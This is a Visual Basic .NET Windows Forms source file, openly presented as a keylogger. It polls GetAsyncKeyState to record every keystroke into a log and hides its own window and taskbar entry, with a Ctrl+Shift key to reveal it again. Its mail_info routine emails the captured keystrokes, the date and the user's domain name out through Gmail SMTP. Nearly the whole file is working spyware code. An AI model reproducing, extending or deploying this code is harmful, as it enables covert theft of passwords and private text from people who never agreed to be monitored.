''' <summary>
''' This Software created by Karan Bhardwaj, require any help contact bhardwajkaran054@gmail.com or visit https://karanbhardwaj.me/
''' Get more project vist my GitHub repository https://github.com/bhardwajkaran054/
''' </summary>
''' <remarks></remarks>
Imports System.Net.Mail

Public Class Form1
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Public log As String
    Dim localDate = DateTime.Now

    Public Sub StartTool()
        Button3.Enabled = True
        Timer1.Start()

        Button1.Text = "Started !"
        Button2.Text = "Stop Recording"
    End Sub

    Public Sub StopTool()
        Button3.Enabled = False
        Timer1.Stop()
        Timer2.Stop()
        Button1.Text = "Start Recording"
        Button2.Text = "Stopped !"
    End Sub

    Public Sub KeyLogger()


        If (GetAsyncKeyState(65)) Then
            log = log + "a"
        ElseIf (GetAsyncKeyState(66)) Then
            log = log + "b"
        ElseIf (GetAsyncKeyState(67)) Then
            log = log + "c"
        ElseIf (GetAsyncKeyState(68)) Then
            log = log + "d"
        ElseIf (GetAsyncKeyState(69)) Then
            log = log + "e"
        ElseIf (GetAsyncKeyState(70)) Then
            log = log + "f"
        ElseIf (GetAsyncKeyState(71)) Then
            log = log + "g"
        ElseIf (GetAsyncKeyState(72)) Then
            log = log + "h"
        ElseIf (GetAsyncKeyState(73)) Then
            log = log + "i"
        ElseIf (GetAsyncKeyState(74)) Then
            log = log + "j"
        ElseIf (GetAsyncKeyState(75)) Then
            log = log + "k"
        ElseIf (GetAsyncKeyState(76)) Then
            log = log + "l"
        ElseIf (GetAsyncKeyState(77)) Then
            log = log + "m"
        ElseIf (GetAsyncKeyState(78)) Then
            log = log + "n"
        ElseIf (GetAsyncKeyState(79)) Then
            log = log + "o"
        ElseIf (GetAsyncKeyState(80)) Then
            log = log + "p"
        ElseIf (GetAsyncKeyState(81)) Then
            log = log + "q"
        ElseIf (GetAsyncKeyState(82)) Then
            log = log + "r"
        ElseIf (GetAsyncKeyState(83)) Then
            log = log + "s"
        ElseIf (GetAsyncKeyState(84)) Then
            log = log + "t"
        ElseIf (GetAsyncKeyState(85)) Then
            log = log + "u"
        ElseIf (GetAsyncKeyState(86)) Then
            log = log + "v"
        ElseIf (GetAsyncKeyState(87)) Then
            log = log + "w"
        ElseIf (GetAsyncKeyState(88)) Then
            log = log + "x"
        ElseIf (GetAsyncKeyState(89)) Then
            log = log + "y"
        ElseIf (GetAsyncKeyState(90)) Then
            log = log + "z"
        ElseIf (GetAsyncKeyState(48)) Then
            log = log + "0"
        ElseIf (GetAsyncKeyState(49)) Then
            log = log + "1"
        ElseIf (GetAsyncKeyState(50)) Then
            log = log + "2"
        ElseIf (GetAsyncKeyState(51)) Then
            log = log + "3"
        ElseIf (GetAsyncKeyState(52)) Then
            log = log + "4"
        ElseIf (GetAsyncKeyState(53)) Then
            log = log + "5"
        ElseIf (GetAsyncKeyState(54)) Then
            log = log + "6"
        ElseIf (GetAsyncKeyState(55)) Then
            log = log + "7"
        ElseIf (GetAsyncKeyState(56)) Then
            log = log + "8"
        ElseIf (GetAsyncKeyState(57)) Then
            log = log + "9"
        ElseIf (GetAsyncKeyState(96)) Then
            log = log + "{Num0}"
        ElseIf (GetAsyncKeyState(97)) Then
            log = log + "{Num1}"
        ElseIf (GetAsyncKeyState(98)) Then
            log = log + "{Num2}"
        ElseIf (GetAsyncKeyState(99)) Then
            log = log + "{Num3}"
        ElseIf (GetAsyncKeyState(100)) Then
            log = log + "{Num4}"
        ElseIf (GetAsyncKeyState(101)) Then
            log = log + "{Num5}"
        ElseIf (GetAsyncKeyState(102)) Then
            log = log + "{Num6}"
        ElseIf (GetAsyncKeyState(103)) Then
            log = log + "{Num7}"
        ElseIf (GetAsyncKeyState(104)) Then
            log = log + "{Num8}"
        ElseIf (GetAsyncKeyState(105)) Then
            log = log + "{Num9}"
        ElseIf (GetAsyncKeyState(106)) Then
            log = log + "{Num*}"
        ElseIf (GetAsyncKeyState(107)) Then
            log = log + "{Num+}"
        ElseIf (GetAsyncKeyState(13)) Then
            log = log + "{Enter}"
        ElseIf (GetAsyncKeyState(109)) Then
            log = log + "{Num-}"
        ElseIf (GetAsyncKeyState(110)) Then
            log = log + "{Num.}"
        ElseIf (GetAsyncKeyState(111)) Then
            log = log + "{Num/}"
        ElseIf (GetAsyncKeyState(32)) Then
            log = log + "{Space}"
        ElseIf (GetAsyncKeyState(8)) Then
            log = log + "{Backspace}"
        ElseIf (GetAsyncKeyState(9)) Then
            log = log + "{Tab}"
        ElseIf (GetAsyncKeyState(16)) Then
            log = log + "{Shift}"
        ElseIf (GetAsyncKeyState(17)) Then
            log = log + "{Control}"
        ElseIf (GetAsyncKeyState(20)) Then
            log = log + "{Caps}"
        ElseIf (GetAsyncKeyState(27)) Then
            log = log + "{Esc}"
        ElseIf (GetAsyncKeyState(33)) Then
            log = log + "{PGup}"
        ElseIf (GetAsyncKeyState(34)) Then
            log = log + "{PGdn}"
        ElseIf (GetAsyncKeyState(35)) Then
            log = log + "{End}"
        ElseIf (GetAsyncKeyState(36)) Then
            log = log + "{Home}"
        ElseIf (GetAsyncKeyState(37)) Then
            log = log + "{LArrow}"
        ElseIf (GetAsyncKeyState(38)) Then
            log = log + "{UArrow}"
        ElseIf (GetAsyncKeyState(39)) Then
            log = log + "{RArrow}"
        ElseIf (GetAsyncKeyState(40)) Then
            log = log + "{DArrow}"
        ElseIf (GetAsyncKeyState(45)) Then
            log = log + "{Insert}"
        ElseIf (GetAsyncKeyState(46)) Then
            log = log + "{Del}"
        ElseIf (GetAsyncKeyState(144)) Then
            log = log + "{NumLock}"
        ElseIf (GetAsyncKeyState(188)) Then
            log = log + "{,}"
        End If
        RichTextBox1.Text = log
        Dim hotkey1 As Boolean
        hotkey1 = GetAsyncKeyState(Keys.K)
        If My.Computer.Keyboard.CtrlKeyDown AndAlso My.Computer.Keyboard.ShiftKeyDown Then
            Me.Visible = True
            Me.ShowInTaskbar = True
        End If
    End Sub

    Public Sub mail_info()
        Try
            Dim smtp_server As New SmtpClient
            Dim e_mail As New MailMessage
            smtp_server.UseDefaultCredentials = False
            smtp_server.Credentials = New Net.NetworkCredential("<your@email.com>", "<@YourPassword#>")
            smtp_server.Port = 587
            smtp_server.EnableSsl = True
            smtp_server.Host = "smtp.gmail.com"
            e_mail = New MailMessage
            e_mail.From = New MailAddress("<your@email.com>")
            e_mail.To.Add("<your@email.com>")
            e_mail.Subject = "Info"
            e_mail.Body = localDate + " " + Environment.UserDomainName + " " + RichTextBox1.Text
            smtp_server.Send(e_mail)
            log = ""
            MsgBox("Mail successfully send")
        Catch ex As Exception
            MsgBox(ex.Message)
            MsgBox("Pls set your email addres and password on code line no. 185, 190, 191 and make sure your email accessable by third party(check your email privacy) ")
        End Try

    End Sub

    Public Sub Hide()
        MsgBox("Press Ctrl+Shift to make keylogger visible !", MsgBoxStyle.Information)
        Me.Visible = "false"
        Me.ShowInTaskbar = "false"
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        StartTool()
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        StopTool()
    End Sub


    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        mail_info()

    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        KeyLogger()
    End Sub

  
    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        '  mail_info()

    End Sub

   

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Button3.Enabled = False
        'Timer1.Start()
        'Timer2.Start()
        'Button1.Text = "Started !"
        'Button2.Text = "Stop Recording"
       
    End Sub

    Private Sub Button3_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click

        Hide()
    End Sub


    Private Sub Form1_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown

        Me.Visible = "true"
        Me.ShowInTaskbar = "true"
    End Sub

    
End Class
